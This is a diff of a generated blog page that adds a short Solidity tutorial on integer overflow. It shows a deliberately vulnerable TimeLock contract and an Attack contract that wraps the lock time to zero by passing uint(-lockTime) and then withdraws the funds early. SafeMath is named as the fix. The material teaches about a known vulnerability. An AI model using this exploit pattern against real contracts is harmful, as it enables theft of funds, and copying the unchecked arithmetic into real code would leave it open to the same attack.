@@ -192,6 +192,10 @@
 
     
     
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>190 Words</span>
+        </span>
+    
     
         <span class="article-min2read article-meta-item">
             <i class="fas fa-clock"></i>&nbsp;<span>1 Mins</span>
@@ -206,7 +210,17 @@
         
 
         <div class="article-content markdown-body">
-            
+            <h1 id="Arithmetic-overflow-ans-underflow"><a href="#Arithmetic-overflow-ans-underflow" class="headerlink" title="Arithmetic overflow ans underflow"></a>Arithmetic overflow ans underflow</h1><p>uint &#x3D; uint 256 </p>
+<p>$$ 0&lt;&#x3D; x &lt;&#x3D; 2^{256}  -1  $$</p>
+<ul>
+<li>overflow&#x2F;underflow</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.10;</span><br><span class="line"></span><br><span class="line">contract TimeLock&#123;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt;uint) public balances;</span><br><span class="line">    mapping(address =&gt; uint) public lockTime ;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable&#123;</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] +=msg.value ;</span><br><span class="line"></span><br><span class="line">        lockTime[msg.sender] =now +1 weeks;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increaseLockTime(uint _second) public &#123;</span><br><span class="line">        lockTime[msg.sender] += _second;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public&#123;</span><br><span class="line">       require(balances[msg.sender] &gt; 0,&quot;insufficient funds&quot;);</span><br><span class="line">       require(now &gt; lockTime[msg.sender],&quot;  lock time not expired&quot;);</span><br><span class="line">   </span><br><span class="line">        uint amount = balances[msg.sender];</span><br><span class="line">        balances[msg.sender]=0;</span><br><span class="line"></span><br><span class="line">        (bool successs, )= msg.sender.call&#123;value : amount&#125;(&quot;&quot;);</span><br><span class="line">        require(successs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> contract Attack&#123;</span><br><span class="line">     TimeLock timelock;</span><br><span class="line"></span><br><span class="line">     constructor(TimeLock _timelock) public&#123;</span><br><span class="line">         timelock= TimeLock(_timelock);</span><br><span class="line">     &#125;</span><br><span class="line">     // 收款也需要payable </span><br><span class="line">     fallback() external payable&#123;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function attach() public payable&#123;</span><br><span class="line">         timelock.deposit&#123;value:msg.value&#125;();</span><br><span class="line">         //t ==current lock time </span><br><span class="line">         //find x such that </span><br><span class="line">         // x+ t = 2 **256 =0</span><br><span class="line">         // x= -t</span><br><span class="line">         timelock.increaseLockTime(</span><br><span class="line">             uint(-timelock.lockTime(address(this)))</span><br><span class="line">         );</span><br><span class="line"></span><br><span class="line">         timelock.withdraw();</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ul>
+<li>通过引入安全库。safemath</li>
+</ul>
+
         </div>
 
         
@@ -413,7 +427,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Arithmetic-overflow-ans-underflow"><span class="nav-number">1.</span> <span class="nav-text">Arithmetic overflow ans underflow</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3"><span class="nav-number">1.1.</span> <span class="nav-text">解决</span></a></li></ol></li></ol>
     </div>
 </div>
         </aside>
